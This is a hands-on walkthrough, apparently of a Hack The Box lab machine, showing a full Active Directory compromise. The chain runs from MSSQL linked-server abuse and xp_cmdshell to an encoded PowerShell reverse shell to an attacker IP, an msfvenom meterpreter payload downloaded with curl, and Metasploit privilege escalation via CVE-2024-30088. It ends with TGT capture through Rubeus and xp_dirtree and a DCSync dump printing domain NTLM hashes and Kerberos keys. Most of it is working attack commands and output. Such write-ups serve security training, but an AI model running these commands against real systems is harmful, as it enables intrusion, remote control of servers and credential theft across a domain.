- As is common in real life pentests, you will start the DarkZero box with credentials for the following account john.w / RFulUtONCOL!
### Nmap
```bash
sudo nmap -sS -sV -sC -vv 10.10.11.89

---OUTPUT---
Nmap scan report for DC01.darkzero.htb (10.10.11.89)
Host is up, received echo-reply ttl 127 (0.032s latency).
Scanned at 2025-12-07 16:31:07 EST for 116s
Not shown: 985 filtered tcp ports (no-response)
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-12-08 04:32:09Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.darkzero.htb
| Issuer: commonName=darkzero-DC01-CA/domainComponent=darkzero
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-07-29T11:40:00
| Not valid after:  2026-07-29T11:40:00
| MD5:   ce57:1ac8:da76:eb62:efe8:4e85:045b:d440
| SHA-1: 603a:f638:aabb:7eaa:1bdb:4256:5869:4de2:98b6:570c
| -----BEGIN CERTIFICATE-----
| MIIHNzCCBR+gAwIBAgITUgAAAAO4Lw91dEi9jwAAAAAAAzANBgkqhkiG9w0BAQsF
| ADBKMRMwEQYKCZImiZPyLGQBGRYDaHRiMRgwFgYKCZImiZPyLGQBGRYIZGFya3pl
| cm8xGTAXBgNVBAMTEGRhcmt6ZXJvLURDMDEtQ0EwHhcNMjUwNzI5MTE0MDAwWhcN
| MjYwNzI5MTE0MDAwWjAcMRowGAYDVQQDExFEQzAxLmRhcmt6ZXJvLmh0YjCCASIw
| DQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBALtgbmGxyLJnTefHNna7EjMScNUA
| n0C+Q4T4jkD9YjX+wpNOXHgmnrqpo8wYV0gQAGK9bnTYC8RJb7vWSZrI3MP+/dHw
| nB6AuOXvz6ahChE6C6wlnxMjD9NeJtwzq/RSpHjBFRc+sfGPbX32Y2CEjqzJISHR
| yOnbnuldHK3I4UNKVN28miXaB/dqrK3/Z6rFOuPWbnEqMuYV4LQh4tvxYb5QALUA
| jTwITLAp1prBoUQkdF5UAcpc/oIuP6VKYpjvv+m/yMuvaDIS+QtjRkP+4+ES0Tk3
| gZ489D4lkgndvw6Oz7MwZtpTXwAvmEWb6L0Pg+M0Vd5UjnkxNUiUsAGKgAECAwEA
| AaOCA0IwggM+MC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdABy
| AG8AbABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0P
| AQH/BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqG
| SIb3DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQB
| AjALBglghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFDd9
| RV4kuWN9NU3bdgWvT4UqaXTjMB8GA1UdIwQYMBaAFGapgxh49WSDZkbTTZ9eZ8L7
| ypx7MIHMBgNVHR8EgcQwgcEwgb6ggbuggbiGgbVsZGFwOi8vL0NOPWRhcmt6ZXJv
| LURDMDEtQ0EsQ049REMwMSxDTj1DRFAsQ049UHVibGljJTIwS2V5JTIwU2Vydmlj
| ZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1kYXJremVybyxEQz1o
| dGI/Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlzdD9iYXNlP29iamVjdENsYXNzPWNS
| TERpc3RyaWJ1dGlvblBvaW50MIHDBggrBgEFBQcBAQSBtjCBszCBsAYIKwYBBQUH
| MAKGgaNsZGFwOi8vL0NOPWRhcmt6ZXJvLURDMDEtQ0EsQ049QUlBLENOPVB1Ymxp
| YyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24s
| REM9ZGFya3plcm8sREM9aHRiP2NBQ2VydGlmaWNhdGU/YmFzZT9vYmplY3RDbGFz
| cz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MD0GA1UdEQQ2MDSgHwYJKwYBBAGCNxkB
| oBIEEOfsqvw66j9ItSxN2uPjJRqCEURDMDEuZGFya3plcm8uaHRiME4GCSsGAQQB
| gjcZAgRBMD+gPQYKKwYBBAGCNxkCAaAvBC1TLTEtNS0yMS0xMTUyMTc5OTM1LTU4
| OTEwODE4MC0xOTg5ODkyNDYzLTEwMDAwDQYJKoZIhvcNAQELBQADggIBAL28m69f
| CO5DYoe/9OPZ5i7haHUhbbyZSv0LRnJawwCP+YLaA6VWpmqBrqAVZ4lvP74KqRSs
| oEkwwX7C8lYEvSA+C97NcpoBzeH9aWCEWC/EaEz3sEL/QKcG7beM04HpP5qIzurP
| gqFJXBwmJSTvNPD53pN7edGlvC0tFgvuqXP/7L2xDnsxHeAA98RUl8NW8rwAlijj
| Car4Q0gryC682mAISxsHlv3Xp5ID5Ny8XkpIY9/qtVCtBXXDMd4XNzt1lGedHDWs
| 1OaZuQvWJMQjKrdFQ59m/bzpLggMlCF7a2TgMJ4wISuJeVXhyd2WXXBQfMigjQVl
| IfR+jf2n43K7ZJOjpZizW4sInL6efS9KW7A6XE7Tzx+ZLdko4sj444mwbXnLgTgQ
| a9N04FJMp6TKLSRO/Vk0AGD9cpLOwINLM2jgPaepAvfThifKGDX2gA4vfFCEVPp1
| /fLrQDjWwZfKBKchZQZ6RZzj1dfnZDIKhV9JT3Kfy1iIFTl2I8YDSmzumXdS4VgY
| pcDf6d2i1duAjNoNvg2pZj7gPzrhzim2g0ezy1Ipcu1AfeJBZ+zlsxpnZ1vPMnQ6
| j2Pwkxplofr8WFcyMBh1lXce8PrTm8+n70sA3D4InyfEhyydgzKsQTmeNbfQCOSY
| TwaWbho49qkLrdLNpB0KN4kHVKKweu3cvvcF
|_-----END CERTIFICATE-----
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.darkzero.htb
| Issuer: commonName=darkzero-DC01-CA/domainComponent=darkzero
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-07-29T11:40:00
| Not valid after:  2026-07-29T11:40:00
| MD5:   ce57:1ac8:da76:eb62:efe8:4e85:045b:d440
| SHA-1: 603a:f638:aabb:7eaa:1bdb:4256:5869:4de2:98b6:570c
| -----BEGIN CERTIFICATE-----
| MIIHNzCCBR+gAwIBAgITUgAAAAO4Lw91dEi9jwAAAAAAAzANBgkqhkiG9w0BAQsF
| ADBKMRMwEQYKCZImiZPyLGQBGRYDaHRiMRgwFgYKCZImiZPyLGQBGRYIZGFya3pl
| cm8xGTAXBgNVBAMTEGRhcmt6ZXJvLURDMDEtQ0EwHhcNMjUwNzI5MTE0MDAwWhcN
| MjYwNzI5MTE0MDAwWjAcMRowGAYDVQQDExFEQzAxLmRhcmt6ZXJvLmh0YjCCASIw
| DQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBALtgbmGxyLJnTefHNna7EjMScNUA
| n0C+Q4T4jkD9YjX+wpNOXHgmnrqpo8wYV0gQAGK9bnTYC8RJb7vWSZrI3MP+/dHw
| nB6AuOXvz6ahChE6C6wlnxMjD9NeJtwzq/RSpHjBFRc+sfGPbX32Y2CEjqzJISHR
| yOnbnuldHK3I4UNKVN28miXaB/dqrK3/Z6rFOuPWbnEqMuYV4LQh4tvxYb5QALUA
| jTwITLAp1prBoUQkdF5UAcpc/oIuP6VKYpjvv+m/yMuvaDIS+QtjRkP+4+ES0Tk3
| gZ489D4lkgndvw6Oz7MwZtpTXwAvmEWb6L0Pg+M0Vd5UjnkxNUiUsAGKgAECAwEA
| AaOCA0IwggM+MC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdABy
| AG8AbABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0P
| AQH/BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqG
| SIb3DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQB
| AjALBglghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFDd9
| RV4kuWN9NU3bdgWvT4UqaXTjMB8GA1UdIwQYMBaAFGapgxh49WSDZkbTTZ9eZ8L7
| ypx7MIHMBgNVHR8EgcQwgcEwgb6ggbuggbiGgbVsZGFwOi8vL0NOPWRhcmt6ZXJv
| LURDMDEtQ0EsQ049REMwMSxDTj1DRFAsQ049UHVibGljJTIwS2V5JTIwU2Vydmlj
| ZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1kYXJremVybyxEQz1o
| dGI/Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlzdD9iYXNlP29iamVjdENsYXNzPWNS
| TERpc3RyaWJ1dGlvblBvaW50MIHDBggrBgEFBQcBAQSBtjCBszCBsAYIKwYBBQUH
| MAKGgaNsZGFwOi8vL0NOPWRhcmt6ZXJvLURDMDEtQ0EsQ049QUlBLENOPVB1Ymxp
| YyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24s
| REM9ZGFya3plcm8sREM9aHRiP2NBQ2VydGlmaWNhdGU/YmFzZT9vYmplY3RDbGFz
| cz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MD0GA1UdEQQ2MDSgHwYJKwYBBAGCNxkB
| oBIEEOfsqvw66j9ItSxN2uPjJRqCEURDMDEuZGFya3plcm8uaHRiME4GCSsGAQQB
| gjcZAgRBMD+gPQYKKwYBBAGCNxkCAaAvBC1TLTEtNS0yMS0xMTUyMTc5OTM1LTU4
| OTEwODE4MC0xOTg5ODkyNDYzLTEwMDAwDQYJKoZIhvcNAQELBQADggIBAL28m69f
| CO5DYoe/9OPZ5i7haHUhbbyZSv0LRnJawwCP+YLaA6VWpmqBrqAVZ4lvP74KqRSs
| oEkwwX7C8lYEvSA+C97NcpoBzeH9aWCEWC/EaEz3sEL/QKcG7beM04HpP5qIzurP
| gqFJXBwmJSTvNPD53pN7edGlvC0tFgvuqXP/7L2xDnsxHeAA98RUl8NW8rwAlijj
| Car4Q0gryC682mAISxsHlv3Xp5ID5Ny8XkpIY9/qtVCtBXXDMd4XNzt1lGedHDWs
| 1OaZuQvWJMQjKrdFQ59m/bzpLggMlCF7a2TgMJ4wISuJeVXhyd2WXXBQfMigjQVl
| IfR+jf2n43K7ZJOjpZizW4sInL6efS9KW7A6XE7Tzx+ZLdko4sj444mwbXnLgTgQ
| a9N04FJMp6TKLSRO/Vk0AGD9cpLOwINLM2jgPaepAvfThifKGDX2gA4vfFCEVPp1
| /fLrQDjWwZfKBKchZQZ6RZzj1dfnZDIKhV9JT3Kfy1iIFTl2I8YDSmzumXdS4VgY
| pcDf6d2i1duAjNoNvg2pZj7gPzrhzim2g0ezy1Ipcu1AfeJBZ+zlsxpnZ1vPMnQ6
| j2Pwkxplofr8WFcyMBh1lXce8PrTm8+n70sA3D4InyfEhyydgzKsQTmeNbfQCOSY
| TwaWbho49qkLrdLNpB0KN4kHVKKweu3cvvcF
|_-----END CERTIFICATE-----
1433/tcp  open  ms-sql-s      syn-ack ttl 127 Microsoft SQL Server 2022 16.00.1000.00; RTM
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 3072
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-12-08T04:20:55
| Not valid after:  2055-12-08T04:20:55
| MD5:   ad3a:4f30:25f8:a3a3:7013:3af2:e09b:b5d7
| SHA-1: 5c77:499c:1da3:1d06:e6b1:d7ad:ddd7:0a20:0a70:a7e7
| -----BEGIN CERTIFICATE-----
| MIIEADCCAmigAwIBAgIQWAYYOqxK6aFNSQXzlegjSzANBgkqhkiG9w0BAQsFADA7
| MTkwNwYDVQQDHjAAUwBTAEwAXwBTAGUAbABmAF8AUwBpAGcAbgBlAGQAXwBGAGEA

| 7spKwvU+8W8Fi37J4yS/v8HZXFC/nin3uZ2JS2QXSqMVOzraTAf7jycTn5fDUbV6
| 1nmq+XTrTxr44CxYEOvwvRo0YqHTxm+uD2lXz0JIXxIl8Jx499JwJNq4NfLMEpfj
| MziW6vVsLBn5/iJnPKPjMxFjjKI=
|_-----END CERTIFICATE-----
| ms-sql-info: 
|   10.10.11.89:1433: 
|     Version: 
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2025-12-08T04:33:53+00:00; +7h00m51s from scanner time.
| ms-sql-ntlm-info: 
|   10.10.11.89:1433: 
|     Target_Name: darkzero
|     NetBIOS_Domain_Name: darkzero
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: darkzero.htb
|     DNS_Computer_Name: DC01.darkzero.htb
|     DNS_Tree_Name: darkzero.htb
|_    Product_Version: 10.0.26100
2179/tcp  open  vmrdp?        syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.darkzero.htb
| Issuer: commonName=darkzero-DC01-CA/domainComponent=darkzero
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-07-29T11:40:00
| Not valid after:  2026-07-29T11:40:00
| MD5:   ce57:1ac8:da76:eb62:efe8:4e85:045b:d440
| SHA-1: 603a:f638:aabb:7eaa:1bdb:4256:5869:4de2:98b6:570c
| -----BEGIN CERTIFICATE-----
| MIIHNzCCBR+gAwIBAgITUgAAAAO4Lw91dEi9jwAAAAAAAzANBgkqhkiG9w0BAQsF
| ADBKMRMwEQYKCZImiZPyLGQBGRYDaHRiMRgwFgYKCZImiZPyLGQBGRYIZGFya3pl

| pcDf6d2i1duAjNoNvg2pZj7gPzrhzim2g0ezy1Ipcu1AfeJBZ+zlsxpnZ1vPMnQ6
| j2Pwkxplofr8WFcyMBh1lXce8PrTm8+n70sA3D4InyfEhyydgzKsQTmeNbfQCOSY
| TwaWbho49qkLrdLNpB0KN4kHVKKweu3cvvcF
|_-----END CERTIFICATE-----
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.darkzero.htb
| Issuer: commonName=darkzero-DC01-CA/domainComponent=darkzero
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-07-29T11:40:00
| Not valid after:  2026-07-29T11:40:00
| MD5:   ce57:1ac8:da76:eb62:efe8:4e85:045b:d440
| SHA-1: 603a:f638:aabb:7eaa:1bdb:4256:5869:4de2:98b6:570c
| -----BEGIN CERTIFICATE-----
| MIIHNzCCBR+gAwIBAgITUgAAAAO4Lw91dEi9jwAAAAAAAzANBgkqhkiG9w0BAQsF
| ADBKMRMwEQYKCZImiZPyLGQBGRYDaHRiMRgwFgYKCZImiZPyLGQBGRYIZGFya3pl

| a9N04FJMp6TKLSRO/Vk0AGD9cpLOwINLM2jgPaepAvfThifKGDX2gA4vfFCEVPp1
| /fLrQDjWwZfKBKchZQZ6RZzj1dfnZDIKhV9JT3Kfy1iIFTl2I8YDSmzumXdS4VgY
| pcDf6d2i1duAjNoNvg2pZj7gPzrhzim2g0ezy1Ipcu1AfeJBZ+zlsxpnZ1vPMnQ6
| j2Pwkxplofr8WFcyMBh1lXce8PrTm8+n70sA3D4InyfEhyydgzKsQTmeNbfQCOSY
| TwaWbho49qkLrdLNpB0KN4kHVKKweu3cvvcF
|_-----END CERTIFICATE-----
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
50000/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

```

- I see mssql open and evilwinrm wont login:
```bash
impacket-mssqlclient john.w@DC01.darkzero.htb -windows-auth
Password: RFulUtONCOL!

---OUTPUT--
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
[!] Press help for extra shell commands
SQL (darkzero\john.w  guest@master)> 

```
xp_cmdshell fails but we check other links to move to:

```bash
enum_links

---OUTPUT---
QL (darkzero\john.w  guest@master)> enum_links
SRV_NAME            SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE      SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT   
-----------------   ----------------   -----------   -----------------   ------------------   ------------   -------   
DC01                SQLNCLI            SQL Server    DC01                NULL                 NULL           NULL      

DC02.darkzero.ext   SQLNCLI            SQL Server    DC02.darkzero.ext   NULL                 NULL           NULL      

Linked Server       Local Login       Is Self Mapping   Remote Login   
-----------------   ---------------   ---------------   ------------   
DC02.darkzero.ext   darkzero\john.w                 0   dc01_sql_svc 
```
- I switch to `DC02.darkzero.ext`
```
use_link [DC02.darkzero.ext]
```
- Here I can enable xp_cmdshell
```
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXECUTE xp_cmdshell 'whoami'
```
- I pass this reverse shell to get a shell as user `sql_svc`:
```
EXECUTE xp_cmdshell 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMgAxACIALAA5ADkAOQA5ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=='
```

![[Pasted image 20251207164657.png]]
- We get a shell on `DC02` (this is not our target)
- Now we need to gain admin shell.
- To do that the vulnerability is the windows version and build : Windows Server 2022 (build 10.0.20348)
	- can find form winpeas
- This results in this cve vulnerability : CVE-2024-30088 TOCTOU vulnerability
- I tried the github exploit but didnt really work. ***Meterpreter*** method works
- I generate a meterpreter payload using msfvenom:
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.21 LPORT=4444 -f exe -o reverse.exe
```
- start a metpreter listener:
```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST tun0
set LPORT 4444
run
```
- On my shell on the target I get the reverse shell and execute it twice to get 2 sessions (as when executing the exploit a session might die)
```
cd C:\ProgramData
curl http://10.10.14.21/reverse.exe -o rev.exe
.\rev.exe
.\rev.exe
```
![[Pasted image 20251207223258.png]]
- then with these sessions in background I execute the exploit on the second session:
```
use exploit/windows/local/cve_2024_30088_authz_basep
set LHOST tun0
set SESSION 2
exploit
```

![[Pasted image 20251207223519.png]]

![[Pasted image 20251207223545.png]]

- can get into the session owned by NT authority.
- Now as NT authority we can perform DC Sync attack on DC01
- Using Rubeus i monitor to monitor for tgt tickets:
```
.\Rubeus.exe monitor /interval:1 /nowrap
```
- Then, to grab a ticket from DC01, I can use xp_dirtree on the mssql we connected to as initial user.
```
EXEC xp_dirtree \\DC02.darkzero.ext\ticket
```
- I catch a ticket from Rubeus:
```
[*] 12/8/2025 9:41:00 AM UTC - Found new TGT:

  User                  :  DC01$@DARKZERO.HTB
  StartTime             :  12/8/2025 1:00:52 AM
  EndTime               :  12/8/2025 11:00:52 AM
  RenewTill             :  12/15/2025 1:00:52 AM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

    doIFjDCCBYigAwIBBaEDAgEWooIElDCCBJBhggSMMIIEiKADAgEFoQ4bDERBUktaRVJPLkhUQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMREFSS1pFUk8uSFRCo4IETDCCBEigAwIBEqEDAgECooIEOgSCBDap1ipZ4RMxGLVUZJ6mx6mwEoPYWYHsKGV0IJyIghla0bP+PGtyUIicTn38DO8f6QB/c3p1YLUAXA//2EVtPTTflOzgVqcr1WC+bA88YG1/aT0/eWViG6HA2aPQtRA/3rhLKNIaqWFZ/ohTyHaF2lnSwtK4ZpJfmzU0g9j+/k7DFJCv/7+2c1AMhwlTzIxkZYxDM5UfVYwkmxNvXIRnWB6yKuwB+E1BvLyEqzHpUOxKGj7B/O20nbpZtI00Pyg/nBWP5CiQ0uRFa6/RJyVF6SjjeB3C4pyiUfaQBVVw7WpydW1N3DB5VP6ufsFVmasIBmjK+3dIDnhP0jzQzkqQCEtI9ghVyY3nHUUCCBh9s/8WVyvi4ZyheePx2ZG6J+DMrm5NGIaRIdwvcN6P0Wn4Rj6O6SuieHZQHXZlaD0ksELJgckiobo0IIR6od56qtpNDt75GpU3PUPVPLeNvePEIjkv4gkB8T+MbXyM7JfDC0Y7JBu9p0U6DL1Cfx1i4aEU8Um7TuLYO0bZdmJzuMEIi5nsJBaAvfyFZpiFqZPOlzrI+ChJh9b9Bp8K68J1pGqsi7vGpe10uOLOacW4gduv1SYwRQAZq/mfp090SPdzMEanSYLGBowUgE4xOOJ5izcGTn4+HczVu5huveEl/t/JsdhjU6V6f0Q7RX53uDCYymaeC5CkS7nEEV9IpyvcHREkLESUTcGi7MqT9YXSXBE2sRoIdwLrF1D/ypUmBaFOe5oWTYnKqYGyqHvKrvJ9SVi9+AN/OBFAg+iJpqi2+lBQwPgvDq1de7A02J4p9YUm1sNdRHXKXJrLNhZVJevGDfw/Bt21i44gnyuohItiQ3pKtDSoQj0mqiPytwtRednRmt+fkT6TeJE4aOWJbZO5mNfXLA7IXyRZ6YnURXdJKI0aDstrS/MC6i9TMLaclmL+zA5Jv+dEviweAFRHEJNEFEYHus7n7nlc77fQ9NkbnvQ6t9e0b5i7TOnJm5ha4Za++Br1uLnk5hxu0zAGyWQ7LAQxcEaJ8GZHXvMohhwZ3oVfdXXFWhps/hC1QUeJ03s63c6AwzAwn/9fll9SQK9xywtxhDgyUXxM/7qT3yVGQf7cxdIzwKryT2GZ9aaH8QPHjvpvDURZYXgj6FJvBrgINNaKA6JqdOIff8KC0LoL+UtOjxaJdM7x026I6kipn1LamYTCeRHbg5YQjMZUfKWUV4JWolTQNN2I5vw2AUZ9XLTqTI8fd0AZ8NVc6+rdB2lq0NjtzETpKOi6U0laThZ8tD+3yOkUgLEARtOj20fZpqlLSSEvJwrfKEGJ+Mplg/EFr0iipR6DKSOfy1UiPhZd1muc628thqSZrGQi+8lhH4O2+U5QbpAw7zMVD+DspMN2Q1jkeZkhTHBlwc4YV/sYjdPHabyuWvcDK4W3zzoxhGX461BzMSeGyYYZo4HjMIHgoAMCAQCigdgEgdV9gdIwgc+ggcwwgckwgcagKzApoAMCARKhIgQguML+FIyxT17CC3OGQW1bLAR67jq+31u/vSiRZ/YP+WShDhsMREFSS1pFUk8uSFRCohIwEKADAgEBoQkwBxsFREMwMSSjBwMFAGChAAClERgPMjAyNTEyMDgwOTAwNTJaphEYDzIwMjUxMjA4MTkwMDUyWqcRGA8yMDI1MTIxNTA5MDA1MlqoDhsMREFSS1pFUk8uSFRCqSEwH6ADAgECoRgwFhsGa3JidGd0GwxEQVJLWkVSTy5IVEI
```
![[Pasted image 20251207223930.png]]
- I copy the encoded ticket into `tgt.b64` and decode it to `tgt.kirbi`
```
cat tgt.b64 | base64 --d > tgt.kirbi
```
- I convert it to `ccache` file:
```
impacket-ticketConverter tgt.kirbi admin.ccache
```
![[Pasted image 20251207224117.png]]
- I export the ticket and try to dump hashes:
```
impacket-secretsdump -k -no-pass darkzero.htb/DC01\$@DC01.darkzero.htb -dc-ip 10.10.11.89
```
- But i encounter a CLOCK_SKEW error
- as `ntpdate` is no longer available I had to find an alternative: `faketime`. I found it was 7 hours from my nmap scan
```
faketime '+7hours' impacket-secretsdump -k -no-pass darkzero.htb/DC01\$@DC01.darkzero.htb -dc-ip 10.10.11.89

---OUTPUT---
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5917507bdf2ef2c2b0a869a1cba40726:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:64f4771e4c60b8b176c3769300f6f3f7:::
john.w:2603:aad3b435b51404eeaad3b435b51404ee:44b1b5623a1446b5831a7b3a4be3977b:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:d02e3fe0986e9b5f013dad12b2350b3a:::
darkzero-ext$:2602:aad3b435b51404eeaad3b435b51404ee:5a9caebc3a454826fdb856385be9d23f:::
[*] Kerberos keys grabbed
Administrator:0x14:2f8efea2896670fa78f4da08a53c1ced59018a89b762cbcf6628bd290039b9cd
Administrator:0x13:a23315d970fe9d556be03ab611730673
Administrator:aes256-cts-hmac-sha1-96:d4aa4a338e44acd57b857fc4d650407ca2f9ac3d6f79c9de59141575ab16cabd
Administrator:aes128-cts-hmac-sha1-96:b1e04b87abab7be2c600fc652ac84362
Administrator:0x17:5917507bdf2ef2c2b0a869a1cba40726
krbtgt:aes256-cts-hmac-sha1-96:6330aee12ac37e9c42bc9af3f1fec55d7755c31d70095ca1927458d216884d41
krbtgt:aes128-cts-hmac-sha1-96:0ffbe626519980a499cb85b30e0b80f3
krbtgt:0x17:64f4771e4c60b8b176c3769300f6f3f7
john.w:0x14:f6d74915f051ef9c1c085d31f02698c04a4c6804d509b7c4442e8593d6d957ea
